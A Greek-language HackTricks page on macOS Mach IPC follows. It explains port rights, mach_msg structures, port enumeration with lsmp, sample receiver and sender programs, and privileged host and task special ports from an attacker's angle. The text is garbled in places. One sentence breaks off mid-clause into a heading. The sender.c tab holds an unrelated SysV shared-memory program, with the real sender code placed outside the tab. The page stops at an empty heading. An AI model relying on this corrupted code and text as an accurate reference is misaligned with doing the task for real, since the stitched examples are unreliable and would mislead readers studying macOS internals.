# macOS IPC - Επικοινωνία Μεταξύ Διεργασιών

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ κάνοντας υποβολή PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Μηνύματα Mach μέσω Θυρών

### Βασικές Πληροφορίες

Το Mach χρησιμοποιεί **εργασίες** ως τη **μικρότερη μονάδα** για την κοινή χρήση πόρων, και κάθε εργασία μπορεί να περιέχει **πολλά νήματα**. Αυτές οι **εργασίες και νήματα αντιστοιχούν 1:1 σε διεργασίες και νήματα POSIX**.

Η επικοινωνία μεταξύ εργασιών πραγματοποιείται μέσω της Διαδικασίας Επικοινωνίας Διεργασίας Mach (IPC), χρησιμοποιώντας μονοδιευθυντικά κανάλια επικοινωνίας. **Τα μηνύματα μεταφέρονται μεταξύ θυρών**, οι οποίες λειτουργούν ως είδος **ουράς μηνυμάτων** που διαχειρίζεται το πυρήνας.

Μια **θύρα** είναι το **βασικό** στοιχείο της Mach IPC. Μπορεί να χρησιμοποιηθεί για να **στείλει μηνύματα και να τα λαμβάνει**.

Κάθε διεργασία έχει μια **πίνακα IPC**, όπου είναι δυνατό να βρεθούν οι **θύρες mach της διεργασίας**. Το όνομα μιας θύρας mach είναι πραγματικά ένας αριθμός (ένας δείκτης στο αντικείμενο πυρήνα).

Μια διεργασία μπορεί επίσης να στείλει ένα όνομα θύρας με κάποια δικαιώματα **σε μια διαφορετική εργασία** και το πυρήνας θα κάνει αυτήν την καταχώριση στο **πίνακα IPC της άλλης εργασίας** να εμφανιστεί.

### Δικαιώματα Θύρας

Τα δικαιώματα θύρας, τα οποία καθορίζουν ποιες λειτουργίες μπορεί να εκτελέσει μια εργασία, είναι καίριας σημασίας για αυτήν την επικοινωνία. Τα πιθανά **δικαιώματα θύρας** είναι ([ορισμοί από εδώ](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Δικαίωμα Λήψης**, το οποίο επιτρέπει τη λήψη μηνυμάτων που στέλνονται στη θύρα. Οι θύρες Mach είναι ουρές MPSC (πολλαπλών παραγωγών, μονός καταναλωτής), που σημαίνει ότι μπορεί να υπάρχει μόνο **ένα δικαίωμα λήψης για κάθε θύρα** σε ολόκληρο το σύστημα (διαφορετικά από τα αγωγά, όπου πολλές διεργασίες μπορούν να κρατούν όλες δείκτες αρχείων στο άκρο ανάγνωσης ενός αγωγού).
* Μια **εργασία με το Δικαίωμα Λήψης** μπορεί να λαμβάνει μηνύματα και **να δημιουργεί Δικαιώματα Αποστολής**, επιτρέποντάς της να στέλνει μηνύματα. Αρχικά μόνο η **ίδια εργασία έχει το Δικαίωμα Λήψης πάνω από τη θύρα της**.
* Εάν ο κάτοχος του Δικαιώματος Λήψης **πεθάνει** ή το κλείσει, το **δικαίωμα αποστολής γίνεται άχρηστο (νεκρό όνομα)**.
* **Δικαίωμα Αποστολής**, το οποίο επιτρέπει την αποστολή μηνυμάτων στη θύρα.
* Το Δικαίωμα Αποστολής μπορεί να **κλωνοποιηθεί** έτσι μια εργασία που κατέχει ένα Δικαίωμα Αποστολής μπορεί να κλωνοποιήσει το δικαίωμα και **να το χορηγήσει σε μια τρίτη εργασία**.
* Σημειώστε ότι τα **δικαιώματα θύρας** μπορούν επίσης να **περάσουν** μέσω μηνυμάτων Mac.
* **Δικαίωμα Αποστολής-Μία-Φορά**, το οποίο επιτρέπει την αποστολή ενός μηνύματος στη θύρα και στη συνέχεια εξαφανίζεται.
* Αυτό το δικαίωμα **δεν** μπορεί να **κλωνοποιηθεί**, αλλά μπορεί να **μετακινηθεί**.
* **Δικαίωμα Συνόλου Θυρών**, το οποίο υποδηλώνει ένα _σύνολο θυρών_ αντί για μια μεμονωμένη θύρα. Η αποσύνθεση ενός μηνύματος από ένα σύνολο θυρών αποσύρει ένα μήνυμα από μία από τις θύρες που περιέχει. Τα σύνολα θυρών μπορούν να χρησιμοποιηθούν για να ακούσουν ταυτόχρονα σε πολλές θύρες, πολύ παρόμοια με το `select`/`poll`/`epoll`/`kqueue` στο Unix.
* **Νεκρό Όνομα**, το οποίο δεν είναι ένα πραγματικό δικαίωμα θύρας, αλλά απλώς ένας αντικαταστάτης. Όταν μια θύρα καταστραφεί, όλα τα υπάρχοντα δικαιώματα θύρας στη θύρα γίνονται νεκρά ονόματα.

**Οι εργασίες μπορούν να μεταφέρουν ΔΙΚΑΙΩΜΑΤΑ ΑΠΟΣΤΟΛΗΣ σε άλλους**, επιτρέποντάς τους να στέλνουν μηνύματα πίσω. **Τα ΔΙΚΑΙΩΜΑΤΑ ΑΠΟΣΤΟΛΗΣ μπορούν επίσης να κλωνοποιηθούν, έτσι μια εργασία μπορεί να διπλασιάσει και να δώσει το δικαίωμα σε μια τρίτη εργασία**. Αυτό, σε συνδυασμό με ένα ενδιάμεσο διεργασία γνωστό ως **διακομιστής εκκίνησης**, επιτρέπει αποτελεσματική επικοινωνία μεταξύ εργασιών.

### Θύρες Αρχείων

Οι θύρες αρχείων επιτρέπουν την ενθυλάκωση αριθμού αρχείου σε θύρες Mac (χρησιμοποιώντας δικαιώματα θύρας Mach). Είναι δυνατόν να δημιουργηθεί ένα `fileport` από έναν δεδομένο FD χρησιμοποιώντας το `fileport_makeport` και να δημιουργηθεί ένα FD από ένα fileport χρησιμοποιώντας το `fileport_makefd`.

### Καθιέρωση Επικοινωνίας

Όπως αναφέρθηκε προηγουμένως, είναι δυνατό να στείλετε δικαιώματα χρησιμοποιώντας μηνύματα Mach, ωστόσο, **δεν μπορείτε να στείλετε ένα δικαίωμα χωρίς να έχετε ήδη ένα δικαίωμα** για να
### Ένα Μήνυμα Mach

[Βρείτε περισσότερες πληροφορίες εδώ](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Η συνάρτηση `mach_msg`, ουσιαστικά ένα κάλεσμα συστήματος, χρησιμοποιείται για την αποστολή και λήψη μηνυμάτων Mach. Η συνάρτηση απαιτεί το μήνυμα που θα αποσταλεί ως αρχικό όρισμα. Αυτό το μήνυμα πρέπει να ξεκινά με μια δομή `mach_msg_header_t`, ακολουθούμενη από το πραγματικό περιεχόμενο του μηνύματος. Η δομή ορίζεται ως εξής:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Οι διεργασίες που διαθέτουν ένα _**δικαίωμα λήψης (receive right)**_ μπορούν να λαμβάνουν μηνύματα σε ένα θύρα Mach. Αντίστροφα, οι **αποστολείς (senders)** διαθέτουν ένα _**δικαίωμα αποστολής (send)**_ ή ένα _**δικαίωμα αποστολής μία φορά (send-once right)**_. Το δικαίωμα αποστολής μία φορά χρησιμοποιείται αποκλειστικά για την αποστολή ενός μόνο μηνύματος, μετά το οποίο γίνεται άκυρο.

Το αρχικό πεδίο **`msgh_bits`** είναι ένα bitmap:

* Το πρώτο bit (πιο σημαντικό) χρησιμοποιείται για να υποδείξει ότι ένα μήνυμα είναι πολύπλοκο (περισσότερα παρακάτω)
* Τα 3ο και 4ο χρησιμοποιούνται από τον πυρήνα
* Τα **5 λιγότερο σημαντικά bits του 2ου byte** μπορούν να χρησιμοποιηθούν για **voucher**: έναν άλλο τύπο θύρας για την αποστολή συνδυασμών κλειδιού/τιμής.
* Τα **5 λιγότερο σημαντικά bits του 3ου byte** μπορούν να χρησιμοποιηθούν για **τοπική θύρα**
* Τα **5 λιγότερο σημαντικά bits του 4ου byte** μπορούν να χρησιμοποιηθούν για **απομακρυσμένη θύρα**

Οι τύποι που μπορούν να καθοριστούν στο voucher, τις τοπικές και απομακρυσμένες θύρες είναι (από το [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Για παράδειγμα, το `MACH_MSG_TYPE_MAKE_SEND_ONCE` μπορεί να χρησιμοποιηθεί για να **υποδείξει** ότι ένα **δικαίωμα αποστολής μία φορά** θα πρέπει να προκύψει και να μεταφερθεί γι' αυτή τη θύρα. Μπορεί επίσης να καθοριστεί το `MACH_PORT_NULL` για να αποτραπεί ο παραλήπτης να μπορεί να απαντήσει.

Για να επιτευχθεί μια εύκολη **διπλής κατεύθυνσης επικοινωνία** ένας διεργασία μπορεί να καθορίσει μια **θύρα mach** στην κεφαλίδα μηνύματος mach που ονομάζεται _θύρα απάντησης_ (**`msgh_local_port`**) όπου ο **παραλήπτης** του μηνύματος μπορεί να **στείλει μια απάντηση** σε αυτό το μήνυμα.

{% hint style="success" %}
Σημειώστε ότι αυτού του είδους η διπλής κατεύθυνσης επικοινωνία χρησιμοποιείται σε μηνύματα XPC που αναμένουν μια απάντηση (`xpc_connection_send_message_with_reply` και `xpc_connection_send_message_with_reply_sync`). Ωστόσο, **συνήθως δημιουργούνται διαφορετικές θύρες** όπως εξηγήθηκε προηγουμένως για τη δημιουργία της διπλής κατεύθυνσης επικοινωνίας.
{% endhint %}

Τα άλλα πεδία της κεφαλίδας του μηνύματος είναι:

- `msgh_size`: το μέγεθος ολόκληρου του πακέτου.
- `msgh_remote_port`: η θύρα στην οποία αποστέλλεται αυτό το μήνυμα.
- `msgh_voucher_port`: [κουπόνια mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: το ID αυτού του μηνύματος, το οποίο ερμηνεύεται από τον παραλήπτη.

{% hint style="danger" %}
Σημειώστε ότι τα **μηνύματα mach αποστέλλονται μέσω μιας `θύρας mach`**, η οποία είναι ένα κανάλι επικοινωνίας **μοναδικού παραλήπτη**, **πολλαπλών αποστολέων** που έχει ενσωματωθεί στον πυρήνα mach. **Πολλές διεργασίες** μπορούν να **στείλουν μηνύματα** σε μια θύρα mach, αλλά ανά πάσα στιγμή μόνο **μια διεργασία μπορεί να διαβάσει** από αυτήν.
{% endhint %}

Τα μηνύματα σχηματίζονται από την κεφαλίδα **`mach_msg_header_t`** ακολουθούμενη από το **σώμα** και από το **τρέιλερ** (εάν υπάρχει) και μπορεί να επιτρέψει την άδεια απάντησης σε αυτό. Σε αυτές τις περιπτώσεις, ο πυρήνας απλώς χρειάζεται να περάσει το μήνυμα από μια εργασία σε μια άλλη.

Ένα **τρέιλερ** είναι **πληροφορίες που προστίθενται στο μήνυμα από τον πυρήνα** (δεν μπορούν να οριστούν από τον χρήστη) τα οποία μπορούν να ζητηθούν κατά τη λήψη μηνύματος με τις σημαίες `MACH_RCV_TRAILER_<trailer_opt>` (υπάρχουν διαφορετικές πληροφορίες που μπορούν να ζητηθούν).

#### Πολύπλοκα Μηνύματα

Ωστόσο, υπάρχουν και άλλα πιο **πολύπλοκα** μηνύματα, όπως αυτά που περνούν επιπλέον δικαιώματα θύρας ή μοιράζονται μνήμη, όπου ο πυρήνας πρέπει επίσης να στείλει αυτά τα αντικείμενα στον παραλήπτη. Σε αυτές τις περιπτώσεις, το πιο σημαντικό bit της κεφαλίδας `msgh_bits` ορίζεται.

Οι πιθανοί περιγραφείς που περνούν καθορίζονται στο [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
### Mac Ports APIs

Σημειώστε ότι τα ports συσχετίζονται με το namespace του task, οπότε για να δημιουργήσετε ή να αναζητήσετε ένα port, το namespace του task επίσης ελέγχεται (περισσότερα στο `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Δημιουργία** ενός port.
- Το `mach_port_allocate` μπορεί επίσης να δημιουργήσει ένα **port set**: δικαίωμα λήψης πάνω από μια ομάδα ports. Κάθε φορά που λαμβάνεται ένα μήνυμα, υποδεικνύεται το port από όπου προήλθε.
- `mach_port_allocate_name`: Αλλαγή του ονόματος του port (προεπιλεγμένα 32bit ακέραιος)
- `mach_port_names`: Λήψη ονομάτων port από έναν στόχο
- `mach_port_type`: Λήψη δικαιωμάτων ενός task πάνω σε ένα όνομα
- `mach_port_rename`: Μετονομασία ενός port (όπως το `dup2` για τα FDs)
- `mach_port_allocate`: Εκχώρηση ενός νέου RECEIVE, PORT\_SET ή DEAD\_NAME
- `mach_port_insert_right`: Δημιουργία ενός νέου δικαιώματος σε ένα port όπου έχετε RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Συναρτήσεις που χρησιμοποιούνται για την **αποστολή και λήψη μηνυμάτων mach**. Η έκδοση overwrite επιτρέπει την καθορισμό διαφορετικού buffer για τη λήψη μηνύματος (η άλλη έκδοση θα το επαναχρησιμοποιήσει).

### Debug mach\_msg

Καθώς οι συναρτήσεις **`mach_msg`** και **`mach_msg_overwrite`** είναι αυτές που χρησιμοποιούνται για την αποστολή και λήψη μηνυμάτων, η ορισμός ενός σημείου αναμονής σε αυτές θα επιτρέψει την επιθεώρηση των απεσταλμένων και ληφθέντων μηνυμάτων.

Για παράδειγμα, ξεκινήστε την αποσφαλμάτωση οποιασδήποτε εφαρμογής που μπορείτε να αποσφαλματώσετε καθώς θα φορτώσει το **`libSystem.B` που θα χρησιμοποιήσει αυτή τη συνάρτηση**.
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Λάβετε τις τιμές από τα μητρώα:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Ελέγξτε την κεφαλίδα του μηνύματος ελέγχοντας τον πρώτο ορισμό:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Αυτο το είδος του `mach_msg_bits_t` είναι πολύ συνηθισμένο για να επιτρέπει μια απάντηση.



### Απαρίθμηση θυρών
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Το **όνομα** είναι το προεπιλεγμένο όνομα που δίνεται στη θύρα (ελέγξτε πώς **αυξάνεται** στα πρώτα 3 bytes). Το **`ipc-object`** είναι το **κρυπτογραφημένο** μοναδικό **αναγνωριστικό** της θύρας.\
Σημειώστε επίσης πώς οι θύρες με μόνο δικαίωμα **`send`** αναγνωρίζουν τον ιδιοκτήτη τους (όνομα θύρας + pid).\
Επίσης, σημειώστε τη χρήση του **`+`** για να υποδείξετε **άλλες εργασίες που συνδέονται με την ίδια θύρα**.

Είναι επίσης δυνατόν να χρησιμοποιήσετε το [**procesxp**](https://www.newosxbook.com/tools/procexp.html) για να δείτε επίσης τα **ονόματα των εγγεγραμμένων υπηρεσιών** (με το SIP απενεργοποιημένο λόγω της ανάγκης του `com.apple.system-task-port`):
```
procesp 1 ports
```
Μπορείτε να εγκαταστήσετε αυτό το εργαλείο στο iOS κατεβάζοντάς το από [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Παράδειγμα κώδικα

Σημειώστε πως ο **αποστολέας** δεσμεύει ένα θύρα, δημιουργεί ένα **δικαίωμα αποστολής** για το όνομα `org.darlinghq.example` και το στέλνει στο **διακομιστή εκκίνησης** ενώ ο αποστολέας ζήτησε το **δικαίωμα αποστολής** αυτού του ονόματος και το χρησιμοποίησε για να **στείλει ένα μήνυμα**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}  
### Αποστολέας.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/shm.h>

#define SHM_SIZE 1024

int main() {
    key_t key = ftok("/tmp/mem.temp", 1);
    int shmid = shmget(key, SHM_SIZE, IPC_CREAT | 0666);
    char *data = shmat(shmid, NULL, 0);

    strcpy(data, "Hello, shared memory!");

    while (1) {
        sleep(1);
    }

    return 0;
}
```

{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## Προνομιούχες Θύρες

Υπάρχουν μερικές ειδικές θύρες που επιτρέπουν την **εκτέλεση συγκεκριμένων ευαίσθητων ενεργειών ή την πρόσβαση σε συγκεκριμένα ευαίσθητα δεδομένα** στην περίπτωση που μια εργασία έχει τις άδειες **SEND** πάνω σε αυτές. Αυτό καθιστά αυτές τις θύρες πολύ ενδιαφέρουσες από την άποψη των επιτιθέμενων όχι μόνο λόγω των δυνατοτήτων αλλά και επειδή είναι δυνατόν να **μοιραστούν οι άδειες SEND μεταξύ εργασιών**.

### Ειδικές Θύρες Οικοδεσπότη

Αυτές οι θύρες εκφράζονται με έναν αριθμό.

Τα δικαιώματα **SEND** μπορούν να αποκτηθούν καλώντας την **`host_get_special_port`** και τα δικαιώματα **RECEIVE** καλώντας την **`host_set_special_port`**. Ωστόσο, και οι δύο κλήσεις απαιτούν τη θύρα **`host_priv`** στην οποία μόνο ο ριζικός χρήστης μπορεί να έχει πρόσβαση. Επιπλέον, στο παρελθόν ο ριζικός χρήστης μπορούσε να καλέσει την **`host_set_special_port`** και να αρπάξει τυχαίες που επέτρεπαν, για παράδειγμα, την παράκαμψη των υπογραφών κώδικα με την αρπαγή της `HOST_KEXTD_PORT` (το SIP τώρα το αποτρέπει).

Αυτές διαιρούνται σε 2 ομάδες: Οι **πρώτες 7 θύρες ανήκουν στον πυρήνα** με την 1 να είναι η `HOST_PORT`, η 2 η `HOST_PRIV_PORT`, η 3 η `HOST_IO_MASTER_PORT` και η 7 η `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Αυτές που ξεκινούν **από** τον αριθμό **8** ανήκουν σε **συστημικούς δαίμονες** και μπορούν να βρεθούν δηλωμένες στο [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).

* **Θύρα Οικοδεσπότη**: Αν ένας διεργασία έχει **προνόμια SEND** πάνω σε αυτήν τη θύρα, μπορεί να λάβει **πληροφορίες** για το **σύστημα** καλώντας τις ρουτίνες της όπως:
* `host_processor_info`: Λήψη πληροφοριών επεξεργαστή
* `host_info`: Λήψη πληροφοριών οικοδεσπότη
* `host_virtual_physical_table_info`: Πίνακας εικονικών/φυσικών σελίδων (απαιτεί MACH\_VMDEBUG)
* `host_statistics`: Λήψη στατιστικών οικοδεσπότη
* `mach_memory_info`: Λήψη διάταξης μνήμης πυρήνα
* **Προνομιούχα Θύρα Οικοδεσπότη**: Μια διεργασία με δικαίωμα **SEND** πάνω σε αυτήν τη θύρα μπορεί να εκτελέσει **προνομιούχες ενέργειες** όπως εμφάνιση δεδομένων εκκίνησης ή προσπάθεια φόρτωσης επέκτασης πυρήνα. Η **διεργασία πρέπει να είναι ριζική** για να λάβει αυτήν την άδεια.
* Επιπλέον, για να καλέσει το API **`kext_request`** απαιτούνται άλλα δικαιώματα **`com.apple.private.kext*`** τα οποία δίνονται μόνο σε δυαδικά αρχεία της Apple.
* Άλλες ρουτίνες που μπορούν να κληθούν είναι:
* `host_get_boot_info`: Λήψη `machine_boot_info()`
* `host_priv_statistics`: Λήψη προνομιούχων στατιστικών
* `vm_allocate_cpm`: Δέσμευση συνεχούς φυσικής μνήμης
* `host_processors`: Αποστολή δικαιωμάτων σε επεξεργαστές οικοδεσπότη
* `mach_vm_wire`: Κάνει τη μνήμη μόνιμη
* Καθώς ο **ριζικός χρήστης** μπορεί να έχει πρόσβαση σε αυτήν την άδεια, θα μπορούσε να καλέσει `host_set_[special/exception]_port[s]` για να **αρπάξει ειδικές ή εξαιρετικές θύρες οικοδεσπότη**.

Είναι δυνατόν να **δείτε όλες τις ειδικές θύρες οικοδεσπότη** εκτελώντας:
```bash
procexp all ports | grep "HSP"
```
### Ειδικές Θύρες Εργασίας

Αυτές είναι οι θύρες που είναι επιφυλαγμένες για γνωστές υπηρεσίες. Είναι δυνατόν να τις ανακτήσετε/ορίσετε καλώντας τις `task_[get/set]_special_port`. Μπορούν να βρεθούν στο αρχείο `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Από [εδώ](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

* **TASK\_KERNEL\_PORT**\[δικαίωμα αποστολής task-self]: Η θύρα που χρησιμοποιείται για τον έλεγχο αυτού του task. Χρησιμοποιείται για την αποστολή μηνυμάτων που επηρεάζουν το task. Αυτή είναι η θύρα που επιστρέφεται από το **mach\_task\_self (δείτε Task Ports παρακάτω)**.
* **TASK\_BOOTSTRAP\_PORT**\[δικαίωμα αποστολής bootstrap]: Η bootstrap θύρα του task. Χρησιμοποιείται για την αποστολή μηνυμάτων που ζητούν την επιστροφή άλλων θυρών υπηρεσιών του συστήματος.
* **TASK\_HOST\_NAME\_PORT**\[δικαίωμα αποστολής host-self]: Η θύρα που χρησιμοποιείται για την αίτηση πληροφοριών του φιλοξενούντος υπολογιστή. Αυτή είναι η θύρα που επιστρέφεται από το **mach\_host\_self**.
* **TASK\_WIRED\_LEDGER\_PORT**\[δικαίωμα αποστολής ledger]: Η θύρα που ονομάζει την πηγή από την οποία το task αντλεί την συνδεδεμένη μνήμη πυρήνα.
* **TASK\_PAGED\_LEDGER\_PORT**\[δικαίωμα αποστολής ledger]: Η θύρα που ονομάζει την πηγή από την οποία το task αντλεί την προεπιλεγμένη μνήμη που διαχειρίζεται.

### Θύρες Task

